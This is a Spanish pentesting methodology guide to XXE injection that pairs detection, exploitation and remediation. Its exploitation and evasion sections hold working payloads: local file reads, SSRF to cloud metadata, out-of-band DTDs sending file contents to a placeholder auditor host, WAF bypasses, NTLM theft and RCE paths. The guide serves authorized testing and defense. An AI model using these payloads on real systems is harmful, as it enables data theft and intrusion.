# Inyección de entidades externas XML (XML External Entity, XXE)

| Clasificación | |
|---|---|
| CWE | CWE-611 — Improper Restriction of XML External Entity Reference; CWE-776 — Recursive Entity References in DTDs (billion laughs); CWE-827 — Improper Control of Document Type Definition |
| OWASP Top 10:2025 | A02 — Security Misconfiguration (configuración insegura del parser); se reporta también bajo A05 — Injection cuando hay inyección en XML construido |
| OWASP API Top 10:2023 | API8:2023 Security Misconfiguration (APIs SOAP/XML) |
| WSTG | WSTG-INPV-07 (Testing for XML Injection) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (clásica, ciega OOB, por error, DTD local, XInclude, ficheros, SAML, PHP/Java) · 5. Evasión · 6. Escalada · 7. Caja blanca por parser · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

XML permite declarar un **DTD** (*Document Type Definition*, la gramática del documento) y, dentro de él, **entidades**: alias que el parser sustituye por un valor. Una **entidad externa** toma su valor de una URI (`SYSTEM "file:///etc/hostname"` o `"http://…"`). Si el parser del servidor procesa DTD y resuelve entidades externas, el atacante puede:

- leer ficheros locales y mostrarlos en la respuesta;
- hacer que el servidor haga peticiones a donde quiera (SSRF, ver `vulns/ssrf.md`);
- exfiltrar datos fuera de banda cuando no ve la respuesta (XXE ciega);
- provocar denegación de servicio con expansión recursiva de entidades (*billion laughs*);
- en casos concretos, ejecutar código (PHP `expect://`, cadenas con Java `jar:`/deserialización).

Las **entidades de parámetro** (`%nombre;`) solo se usan dentro del DTD y son la base de las técnicas ciegas. **XInclude** es otro mecanismo de inclusión que funciona aunque no controles el documento entero.

Causa raíz: parsers configurados (o con valores por defecto históricos) que procesan DTD y resuelven entidades externas o XInclude. Java (JAXP), .NET Framework antiguo, libxml2 con `NOENT`, Nokogiri con `noent`, `libxmljs` con `noent: true` y muchas librerías de documentos (Office, SVG, SAML) son los focos habituales.

## 2. Dónde buscar (señales del reconocimiento)

- Peticiones con `Content-Type: application/xml`, `text/xml`, `application/soap+xml`; endpoints `/ws`, `/soap`, `/services`, `?wsdl`, `/xmlrpc.php`.
- APIs JSON que aceptan XML si cambias el `Content-Type` (frameworks con negociación de contenido: Spring con Jackson XML, JAX-RS, ASP.NET Web API, Rails antiguo).
- Subida o importación de ficheros basados en XML: SVG, DOCX/XLSX/PPTX (ZIP con XML dentro), ODT, EPUB, KML/GPX, XLIFF, RSS/Atom, sitemaps, `.plist`, XMP en imágenes, informes JUnit/Cobertura en CI.
- SSO con **SAML** (`SAMLResponse` en POST, Base64): ver también `vulns/oauth-oidc-saml.md`.
- Conversores a PDF (XSL-FO, Apache FOP), procesadores XSLT, firmas XML (XML-DSig), servicios de facturación electrónica (UBL, Facturae), sistemas bancarios ISO 20022.
- Errores reveladores: `org.xml.sax.SAXParseException`, `DOCTYPE is disallowed`, `XmlException`, `simplexml_load_string()`, `lxml.etree.XMLSyntaxError`, `Entity 'x' not defined`.

## 3. Detección segura (primeras sondas, no destructivas)

Paso 1 — ¿se procesa el DTD? Entidad **interna** (no toca ficheros ni red):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY c0 "c0rvus9359"> ]>
<r><name>&c0;</name></r>
```

Si `c0rvus9359` aparece donde antes aparecía el nombre, el DTD se procesa. Un error `DOCTYPE is disallowed` indica parser endurecido.

Paso 2 — ¿resuelve entidades externas hacia fuera? OAST con entidad general y con entidad de parámetro:

```xml
<!DOCTYPE r [ <!ENTITY c0 SYSTEM "http://c0rvus.OAST/x"> ]>
<r><name>&c0;</name></r>
```

```xml
<!DOCTYPE r [ <!ENTITY % c0 SYSTEM "http://c0rvus.OAST/p"> %c0; ]>
<r/>
```

Paso 3 — lectura de un fichero **inocuo**:

```xml
<!DOCTYPE r [ <!ENTITY c0 SYSTEM "file:///etc/hostname"> ]>
<r><name>&c0;</name></r>
```

Windows: `file:///C:/Windows/win.ini`. Evita `/etc/shadow` y ficheros con secretos como primera prueba.

Paso 4 — si no controlas el DOCTYPE (el XML lo arma el servidor con tu valor dentro), XInclude:

```xml
<c0 xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></c0>
```

En un parámetro: `productId=<c0 xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></c0>`.

⚠️ **No envíes billion laughs ni entidades que apunten a `/dev/random` o a recursos infinitos** para “probar”: son DoS y **requieren confirmación explícita del cliente**.

## 4. Explotación por contexto o tecnología

### 4.1 XXE clásica (con reflejo)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&x;</productId></stockCheck>
```

Java con `file:` sobre un **directorio** devuelve el listado: `file:///` o `file:///var/www/` (muy útil para descubrir rutas).

PHP: ficheros con `<`, `&` o binarios rompen el XML; usa `php://filter`:

```xml
<!DOCTYPE r [ <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"> ]>
<r>&x;</r>
```

SSRF hacia servicios internos (ver `vulns/ssrf.md`):

```xml
<!DOCTYPE r [ <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<r>&x;</r>
```

IMDSv1 responde a un GET simple; **IMDSv2** exige un `PUT` previo con cabecera, que una entidad externa no puede enviar; GCP y Azure exigen cabeceras (`Metadata-Flavor: Google`, `Metadata: true`). Documenta el límite en lugar de forzarlo.

### 4.2 XXE ciega fuera de banda (OOB) con DTD externo

Petición:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % dtd SYSTEM "https://SERVIDOR_AUDITOR/c0.dtd"> %dtd; ]>
<r>c0</r>
```

`c0.dtd` alojado por el auditor:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://SERVIDOR_AUDITOR/?d=%file;'>">
%eval;
%exfil;
```

Notas prácticas:

- No se puede definir la entidad que usa `%file;` en el DTD **interno** (la especificación prohíbe referencias a entidades de parámetro dentro de declaraciones del subconjunto interno); por eso se carga un DTD externo.
- Ficheros multilínea: Java moderno rechaza saltos de línea en URLs HTTP; usa `ftp://SERVIDOR_AUDITOR:2121/%file;` con un servidor FTP de recogida (xxeserv, XXEinjector) o combina con `php://filter/convert.base64-encode` en PHP.
- Si solo sale DNS, exfiltra fragmentos cortos en el subdominio o limita la prueba a la interacción.

### 4.3 XXE basada en errores

DTD externo que provoca un error con el contenido del fichero en el mensaje:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### 4.4 Reutilizar un DTD local (sin salida a Internet)

Si el servidor no puede contactar con el exterior pero muestra errores, se **redefine** una entidad de parámetro de un DTD que ya existe en el sistema; desde un DTD externo (aunque sea local) sí se permiten las construcciones anidadas:

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/hostname">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<message>c0</message>
```

Otros DTD locales habituales (comprobar existencia primero con una entidad que apunte al fichero y observar el error): `/usr/share/xml/fontconfig/fonts.dtd`, DTD de JBoss/WildFly, Tomcat y librerías Java dentro de los JAR (`jar:file:///…!/…dtd`). La herramienta **dtd-finder** (GoSecure) enumera DTD explotables y la entidad a redefinir.

### 4.5 XXE en ficheros

**SVG** (avatar, logotipo; se procesa con ImageMagick, librsvg, Batik o un parser propio):

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY x SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="60"><text x="0" y="30" font-size="20">&x;</text></svg>
```

La miniatura generada mostrará el contenido. Variante OOB: `<!ENTITY % d SYSTEM "http://c0rvus.OAST/svg"> %d;`.

**DOCX/XLSX/PPTX/ODT/EPUB** (ZIP con XML):

```bash
mkdir c0 && cd c0 && unzip ../plantilla.docx
# Insertar en word/document.xml (o [Content_Types].xml, xl/workbook.xml, xl/sharedStrings.xml, content.opf):
#   <!DOCTYPE r [ <!ENTITY % d SYSTEM "http://c0rvus.OAST/docx"> %d; ]>
zip -r ../c0rvus.docx . && cd ..
```

Prueba también `[Content_Types].xml` y `docProps/core.xml`, que muchos importadores leen primero.

**SOAP:**

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><getUser><id><![CDATA[<!DOCTYPE r [<!ENTITY % d SYSTEM "http://c0rvus.OAST/soap"> %d;]><r/>]]></id></getUser></soap:Body>
</soap:Envelope>
```

(El CDATA solo funciona si la aplicación vuelve a parsear el valor como XML; si no, coloca el DOCTYPE antes del `Envelope`.)

**SAML:** el `SAMLResponse` se decodifica de Base64 y se parsea **antes** de validar la firma en muchas implementaciones. Inserta el DOCTYPE al inicio del documento decodificado y vuelve a codificar:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % d SYSTEM "http://c0rvus.OAST/saml"> %d; ]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" …>…</samlp:Response>
```

**RSS/Atom, sitemap, KML, GPX, XLIFF, plist:** mismo patrón en el fichero importado o en la URL de feed que el servidor descarga.

### 4.6 Protocolos y envoltorios según la plataforma

| Plataforma | Esquemas útiles |
|---|---|
| Java | `file:`, `http(s):`, `ftp:`, `jar:` (descarga a fichero temporal y lee una entrada), `netdoc:` (Java ≤ 8), `gopher:` (eliminado en JDK modernos) |
| PHP (libxml2) | `file:`, `http:`, `ftp:`, `php://filter/…`, `data:`, `expect://id` (solo con extensión `expect`, muy rara) ⚠️, `phar://` (deserialización en PHP < 8, ver `vulns/deserialization.md`) |
| .NET | `file:`, `http(s):`, UNC `\\servidor\recurso` (⚠️ provoca autenticación NTLM saliente) |
| libxml2 (Python lxml, Ruby Nokogiri, PHP) | `file:`, `http:`, `ftp:` (sin `https` en algunas compilaciones) |

### 4.7 Inyección XML sin DTD

Aunque las entidades estén deshabilitadas, si el servidor **construye** XML concatenando, puedes inyectar etiquetas que cambian la lógica:

```text
nombre=c0rvus</name><role>admin</role><name>x
cantidad=1</qty><price>0.01</price><qty>1
```

### 4.8 XSLT

Si el usuario controla una hoja XSLT (exportadores, transformaciones configurables):

```xml
<xsl:value-of select="system-property('xsl:vendor')"/>                 <!-- huella del procesador -->
<xsl:copy-of select="document('file:///etc/hostname')"/>                 <!-- lectura -->
<xsl:copy-of select="document('http://c0rvus.OAST/xslt')"/>              <!-- OOB/SSRF -->
<!-- PHP con registerPHPFunctions: php:function('system','id')  ⚠️ -->
<!-- Xalan-J: extensiones Java (rt:exec)  ⚠️ -->
```

## 5. Evasión de filtros y WAF

```xml
<!-- XML distingue mayúsculas: <!doctype> no es válido en un parser conforme; no pierdas tiempo con eso -->
<!-- PUBLIC en lugar de SYSTEM -->
<!DOCTYPE r [ <!ENTITY x PUBLIC "c0" "file:///etc/hostname"> ]>
<!-- Solo entidades de parámetro (sin &x; en el cuerpo) -->
<!DOCTYPE r [ <!ENTITY % d SYSTEM "http://c0rvus.OAST/"> %d; ]>
<!-- Esquema sin barras o codificado (según parser) -->
file:/etc/hostname        file:%2Fetc%2Fhostname
```

- **Cambio de codificación:** convierte el documento a UTF-16 (`iconv -f UTF-8 -t UTF-16BE c0.xml > c0-16.xml`, con `<?xml version="1.0" encoding="UTF-16BE"?>`) o UTF-7 en parsers antiguos; los WAF que buscan `<!ENTITY` en ASCII no lo ven.
- **Cambio de `Content-Type`** a `text/xml`, `application/xml`, `application/soap+xml`, o subir el mismo XML como fichero `.svg`/`.docx`.
- **XInclude** cuando el filtro solo bloquea `<!DOCTYPE`.
- **Espacios y saltos** dentro de la declaración, comentarios entre tokens, entidades numéricas en valores.
Ver `vulns/waf-bypass.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

1. **Lectura controlada:** `/etc/hostname`, después un fichero de la aplicación que demuestre acceso a configuración (`WEB-INF/web.xml`, `appsettings.json`, `.env`): muestra la ruta y una línea con valores redactados.
2. **Listado de directorios** (Java) para localizar código y secretos sin leerlos todos.
3. **SSRF:** servicios internos y metadatos de nube; credenciales IAM solo con autorización (⚠️ requiere confirmación explícita del cliente).
4. **Robo de hash NTLM** en Windows vía UNC: ⚠️ ataque a credenciales, **requiere confirmación explícita del cliente**.
5. **Hacia RCE:** `expect://` en PHP, `phar://` + gadget en PHP < 8, `jar:` para dejar ficheros temporales que otra vulnerabilidad incluye, XSLT con extensiones. Solo con comando inocuo y autorización.
6. **SAML:** XXE en el SP → lectura de la clave privada del SP → forja de aserciones (impacto crítico; demostrar solo la lectura de la ruta, no la clave completa).

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Java (JAXP y librerías)** — vulnerables por defecto salvo configuración: `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory` (StAX), `TransformerFactory`, `SchemaFactory`, `Validator`, `XMLReader`, `SAXBuilder` (JDOM), `SAXReader` (dom4j), `Unmarshaller` de JAXB sobre `StreamSource`, `Digester`.

```java
// Vulnerable
DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
Document d = db.parse(request.getInputStream());
// Seguro
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false); dbf.setExpandEntityReferences(false);
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, ""); dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
// StAX
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
// TransformerFactory
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, ""); tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

**.NET** — `XmlDocument`/`XmlTextReader` fueron vulnerables por defecto antes de .NET Framework 4.5.2; en .NET Core/.NET 5+ los valores por defecto son seguros salvo que se asigne un `XmlResolver` o `DtdProcessing.Parse`.

```csharp
// Vulnerable
var doc = new XmlDocument { XmlResolver = new XmlUrlResolver() }; doc.LoadXml(input);
var r = XmlReader.Create(s, new XmlReaderSettings { DtdProcessing = DtdProcessing.Parse, XmlResolver = new XmlUrlResolver() });
// Seguro
var r = XmlReader.Create(s, new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null });
var doc = new XmlDocument { XmlResolver = null };
```

**PHP (libxml2 ≥ 2.9 no carga entidades externas salvo que se pida)**

```php
// Vulnerable: LIBXML_NOENT ACTIVA la sustitución de entidades; LIBXML_DTDLOAD carga DTD externos
$x = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
$d = new DOMDocument(); $d->loadXML($input, LIBXML_NOENT); $d->xinclude();
// Seguro
$x = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NONET);   // sin NOENT ni DTDLOAD
// libxml_disable_entity_loader() está obsoleta desde PHP 8.0 (innecesaria con libxml2 ≥ 2.9)
```

**Python**

```python
# Vulnerable
etree.fromstring(data, etree.XMLParser(resolve_entities=True, no_network=False))   # lxml explícito
etree.parse(f, etree.XMLParser(load_dtd=True)) ; doc.xinclude()
xml.sax con feature_external_ges = True
# xml.etree.ElementTree no resuelve entidades externas, pero versiones antiguas de expat son vulnerables a billion laughs
# Seguro
from defusedxml.ElementTree import fromstring            # o defusedxml.lxml (obsoleto) / parser lxml endurecido:
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False, huge_tree=False)
```

(En lxml 5.x el valor por defecto de `resolve_entities` pasó a `'internal'`; sigue siendo recomendable fijarlo explícitamente.)

**Node.js**

```js
// Vulnerable
libxmljs.parseXml(input, { noent: true, dtdload: true });
// Seguro: libxmljs sin noent; o parsers sin soporte de DTD externo (fast-xml-parser, xml2js/sax)
```

**Go** — `encoding/xml` no resuelve entidades externas; el riesgo aparece con bindings a libxml2 (`github.com/lestrrat-go/libxml2`) o conversores externos.

**Ruby**

```ruby
# Vulnerable
Nokogiri::XML(input) { |c| c.noent }          # o c.dtdload; Nokogiri::XML(input, nil, nil, Nokogiri::XML::ParseOptions::NOENT)
REXML con versiones antiguas: DoS por expansión (varias CVE)
# Seguro
Nokogiri::XML(input) { |c| c.strict.nonet }   # sin noent/dtdload
```

**Búsqueda (ripgrep / semgrep)**

```bash
rg -n --pcre2 '(DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory|SchemaFactory|SAXBuilder|SAXReader|XMLReaderFactory)\.newInstance|new (SAXBuilder|SAXReader)\(' --type java
rg -n 'disallow-doctype-decl|IS_SUPPORTING_EXTERNAL_ENTITIES|ACCESS_EXTERNAL_DTD' --type java     # ausencia = señal
rg -n --pcre2 'DtdProcessing\.Parse|XmlUrlResolver|new XmlTextReader|ProhibitDtd\s*=\s*false' --type cs
rg -n --pcre2 'LIBXML_NOENT|LIBXML_DTDLOAD|->xinclude\(' --type php
rg -n --pcre2 'resolve_entities\s*=\s*True|load_dtd\s*=\s*True|feature_external_ges|\.xinclude\(' --type py
rg -n --pcre2 'noent\s*:\s*true' --type js
rg -n --pcre2 '\.noent|ParseOptions::NOENT|DTDLOAD' --type ruby
semgrep --config p/owasp-top-ten --config p/java --config p/csharp .
```

## 8. Falsos positivos frecuentes

- La entidad interna se expande pero las externas no: hay procesamiento de DTD (dato útil) pero no XXE; repórtalo como endurecimiento incompleto solo si hay riesgo de DoS.
- Interacción OAST originada por un validador de enlaces, un antivirus o un proxy que lee el cuerpo, no por el parser: revisa IP de origen, user-agent (`Java/1.8`, `libxml`, `Microsoft-CryptoAPI`) y que el DTD se pidió **antes** que el `%exfil;`.
- Contenido del fichero visible porque el propio cliente lo envió (por ejemplo, en un importador que muestra el XML original).
- SVG renderizado en el **navegador** (no en el servidor): eso es XSS, no XXE.
- Error `DOCTYPE is disallowed` interpretado como vulnerable: es precisamente la defensa.

## 9. Evidencia mínima para validarlo

- Petición y respuesta con la entidad interna (prueba de DTD) y con la externa (fichero inocuo u OAST).
- Para OOB: registro del servidor del auditor con la petición del DTD y la de exfiltración (IP, hora, user-agent).
- Parser/plataforma inferidos (error, user-agent de la petición saliente), ruta del fichero leído.
- Si hay SSRF: una respuesta de un servicio interno inocuo, nunca credenciales completas.

## 10. Severidad orientativa

| Impacto | CVSS 3.1 | CVSS 4.0 (calcular con FIRST) |
|---|---|---|
| Lectura de ficheros arbitrarios sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` (≈8.7) |
| Lectura + SSRF a red interna/nube con datos de otros sistemas | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` (8.6) | `…/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` |
| XXE ciega solo con interacción OOB (sin datos) | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3) | `…/VC:L/VI:N/VA:N/…` |
| Autenticado, lectura de ficheros | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5) | `…/PR:L/…/VC:H/…` |
| Lectura de clave SAML del SP → suplantación de cualquier usuario | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (9.1) | `…/VC:H/VI:H/VA:N/…` |
| DoS por expansión (si se autorizó probarlo) | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (7.5) | `…/VC:N/VI:N/VA:H/…` |

## 11. Remediación

1. **Prohibir DTD** en todos los parsers (`disallow-doctype-decl`, `DtdProcessing.Prohibit`), y si no es posible, desactivar entidades externas, DTD externos y XInclude.
2. Centralizar la creación de parsers en una única factoría segura y prohibir `newInstance()` directos con una regla de semgrep en CI.
3. Usar librerías endurecidas (`defusedxml` en Python), mantener libxml2/Xerces/.NET actualizados.
4. Procesar ficheros de usuarios (SVG, Office) en servicios aislados sin acceso a red ni a ficheros sensibles; restringir la salida a Internet de los servidores (corta OOB y SSRF).
5. Preferir JSON cuando XML no sea necesario; en SAML, usar librerías mantenidas que rechazan DTD antes de validar la firma.

```java
public final class SafeXml {
  public static DocumentBuilder builder() throws ParserConfigurationException {
    DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
    f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    f.setXIncludeAware(false);
    f.setExpandEntityReferences(false);
    f.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
    f.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
    return f.newDocumentBuilder();
  }
}
```

## 12. Herramientas

- **Burp Suite** (Repeater, Scanner como apoyo, Collaborator), extensión *Content Type Converter* (JSON → XML).
- **interactsh-client** o un servidor HTTP propio para alojar el DTD: `python3 -m http.server 8000`.
- **XXEinjector** (Ruby): automatiza OOB, FTP y enumeración de directorios; usar tras confirmar manualmente.
- **xxeserv** / **xxe-ftp-server**: recogida de ficheros multilínea por FTP.
- **dtd-finder** (GoSecure): busca DTD locales reutilizables.
- **oxml_xxe** y **docem**: insertar payloads en documentos Office/SVG.
- **semgrep** (`p/owasp-top-ten`, `p/java`), **CodeQL** (`java/xxe`, `cs/xml/insecure-dtd-handling`, `py/xxe`).

## 13. Referencias

- OWASP XML External Entity Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- OWASP WSTG-INPV-07: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Tests/07-Input_Validation_Testing/07-Testing_for_XML_Injection
- PortSwigger Web Security Academy — XXE: https://portswigger.net/web-security/xxe (incluye la reutilización de DTD locales)
- PayloadsAllTheThings — XXE Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- HackTricks — XXE: https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
- GoSecure — dtd-finder: https://github.com/GoSecure/dtd-finder
- CWE-611: https://cwe.mitre.org/data/definitions/611.html · CWE-776: https://cwe.mitre.org/data/definitions/776.html
- Relacionados: `vulns/ssrf.md`, `vulns/file-upload.md`, `vulns/oauth-oidc-saml.md`, `vulns/deserialization.md`, `vulns/waf-bypass.md`.
